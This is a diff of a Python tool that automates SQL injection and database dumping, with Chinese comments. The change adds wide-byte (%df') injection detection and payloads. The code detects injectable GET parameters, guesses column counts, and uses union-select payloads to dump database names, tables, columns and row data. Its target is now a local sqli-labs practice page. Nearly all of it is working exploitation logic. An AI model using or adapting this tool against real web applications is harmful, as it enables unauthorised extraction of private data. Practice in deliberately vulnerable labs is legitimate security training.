@@ -67,7 +67,7 @@ def get_baseline(url):
 
 def check_sql_injection(base_url, param_name):
     """
-    检测GET参数是否存在SQL注入，返回字典:
+    检测GET参数是否存在SQL注入,返回字典:
     {"has_inject": bool, "inject_type": str}
     """
     if not is_target_allowd(base_url):
@@ -93,12 +93,36 @@ def check_sql_injection(base_url, param_name):
                 has_error_confirm = any(key in resp_confirm.text for key in ERROR_KEYWORDS)
                 len_diff_confirm = abs(len(resp_confirm.text) - baseline["length"])
                 if has_error_confirm and len_diff_confirm > 20:
-                    logging.info("二次验证通过，确认字符型SQL注入")
+                    logging.info("二次验证通过,确认字符型SQL注入")
                     return {"has_inject": True, "inject_type": "字符型注入"}
                 else:
                     logging.warning("二次验证未通过，忽略疑似误报")
             else:
                 logging.warning("二次验证请求失败，忽略疑似误报")
+    #宽字节注入测试
+    test_wide = base_url.replace(f"{param_name}=1",f"{param_name}=1%df'")
+    resp_wide = send_request(test_wide)
+    if resp_wide and resp_wide.text:
+        has_error_wide = any(key in resp_wide.text for key in ERROR_KEYWORDS)
+        len_diff_wide = abs(len(resp_wide.text) - baseline["length"])
+        
+        if has_error_wide and len_diff_wide > 20:
+            #二次验证
+            resp_wide_confirm = send_request(test_wide)
+            if resp_wide_confirm and resp_wide_confirm.text:
+                has_error_wide_confirm = any(key in resp_wide_confirm.text for key in ERROR_KEYWORDS)
+                has_diff_wide__confirm = abs(len(resp_wide_confirm.text) - baseline["length"])
+                if has_error_wide_confirm and has_diff_wide__confirm > 20:
+                    logging.info("二次验证通过,确认宽字节SQL注入")
+                    return {"has_inject":True,"inject_type":"宽字节SQL注入"}
+                else:
+                    logging.warning("二次验证未通过,忽略疑似误报")
+            else:
+                logging.warning("二次验证请求失败忽略,疑似误报")
+
+    
+
+
 
     # 数字型注入测试（逻辑真假对比）
     true_url = base_url.replace(f"{param_name}=1", f"{param_name}=1 and 1=1")
@@ -129,6 +153,8 @@ def guess_columns(base_url, param_name, max_columns=10, inject_type="数字型�
     for n in range(1, max_columns + 1):
         if "字符型" in inject_type:
             payload = f"1' order by {n} %23"
+        elif "宽字节" in inject_type:
+            payload = f"1%df' order by {n}%23"
         else:
             payload = f"1 order by {n} %23"
         
@@ -162,6 +188,8 @@ def get_echo_positions(base_url, param_name, columns, inject_type="数字型注�
     if "字符型" in inject_type:
         # 不用注释符，直接闭合引号并让后面条件为真
         payload = f"-1' union select {num_str} or '1'='1"
+    elif "宽字节" in inject_type:
+        payload = f"-1%df' union select {num_str} or %df'1%df' = %df'1"
     else:
         payload = f"-1 union select {num_str}"
     
@@ -202,6 +230,8 @@ def dump_current_db(base_url, param_name, echo_pos, columns, inject_type="数字
     
     if "字符型" in inject_type:
         payload = f"-1' union select {num_str} --+"
+    elif "宽字节" in inject_type:
+        payload = f" -1%df' union select {num_str} --+"
     else:
         payload = f"-1 union select {num_str} --+"
     
@@ -227,6 +257,8 @@ def dump_tables(base_url, param_name, echo_pos, db_name, columns, inject_type="�
 
     if "字符型" in inject_type:
         payload = f"-1' union select {select_fields} {from_part} --+"
+    elif "宽字节" in inject_type:
+        payload = f"-1%df' union select {select_fields} {from_part} --+"
     else:
         payload = f"-1 union select {select_fields} {from_part} --+"
 
@@ -243,7 +275,7 @@ def dump_tables(base_url, param_name, echo_pos, db_name, columns, inject_type="�
     return tables
 
 def dump_columns(base_url, param_name, echo_pos, table_name, columns, inject_type="字符型注入"):
-    """获取表全部列名,table_name转为十六进制，避免单引号"""
+    """获取表全部列名,table_name转为十六进制,避免单引号"""
     # users 十六进制：0x7573657273，这里通用转换
     table_hex = "0x" + table_name.encode('utf-8').hex()
     field_concat = "concat(0x3c3c3c, group_concat(column_name), 0x3e3e3e)"
@@ -254,6 +286,8 @@ def dump_columns(base_url, param_name, echo_pos, table_name, columns, inject_typ
 
     if "字符型" in inject_type:
         payload = f"-1' union select {select_fields} {from_part} --+"
+    elif "宽字节" in inject_type:
+        payload = f"-1%df' union select {select_fields} {from_part} --+"
     else:
         payload = f"-1 union select {select_fields} {from_part} --+"
 
@@ -280,6 +314,8 @@ def dump_table_data(base_url, param_name, echo_pos, table_name, col_list, column
 
     if "字符型" in inject_type:
         payload = f"-1' union select {select_fields} {from_part} --+"
+    elif "宽字节" in inject_type:
+        payload = f"-1%df' union select {select_fields} {from_part} --+"
     else:
         payload = f"-1 union select {select_fields} {from_part} --+"
 
@@ -365,7 +401,7 @@ def auto_dump_injection(base_url, param_name):
     return result
 
 if __name__ == "__main__":
-    target = "http://127.0.0.1:8080/Less-1/?id=1"
+    target = "http://localhost/sqli-labs/Less-32/?id=1 "
     param = "id"
     
     logging.info(f"开始自动脱库：{target}")
